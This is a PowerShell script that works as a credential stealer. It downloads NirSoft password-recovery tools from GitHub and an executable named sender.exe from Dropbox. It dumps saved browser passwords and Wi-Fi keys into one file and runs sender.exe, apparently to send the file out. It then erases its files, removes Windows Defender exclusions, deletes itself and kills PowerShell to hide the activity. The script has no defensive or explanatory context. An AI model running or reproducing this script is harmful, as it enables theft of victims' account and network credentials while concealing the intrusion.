Set-Location C:\Users\Public\Documents
Invoke-WebRequest "https://github.com/kidarok/Nirsoft_Tools/blob/main/WebBrowserPassView.exe?raw=true" -OutFile WebBrowserPassView.exe
Invoke-WebRequest "https://www.dropbox.com/scl/fi/ifqiidqe5xw9zmnt38ey5/sender.exe?rlkey=8evebo34uqzbnt83swh3kxv8x&dl=1" -OutFile sender.exe
Invoke-WebRequest "https://github.com/kidarok/Nirsoft_Tools/blob/main/WirelessKeyView.exe?raw=true" -OutFile WirelessKeyView.exe
.\WebBrowserPassView.exe /stext f.txt
Start-Sleep 3
.\WirelessKeyView.exe /stext f2.txt
Start-Sleep 3
Get-Content -Path f.txt, f2.txt > data.txt
.\sender.exe
Start-Sleep 5
Remove-Item .\dane.txt
Remove-Item .\f.txt
Remove-Item .\f2.txt
Remove-Item .\WebBrowserPassView.exe
Remove-Item .\sender.exe
Remove-Item .\WirelessKeyView.exe
Remove-MpPreference -ExclusionPath C:\Users\Public\Documents\ -Force
Remove-MpPreference -ExclusionExtension .ps1 -Force
Remove-Item .\main.ps1
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
taskkill -F /IM powershell.exe
exit
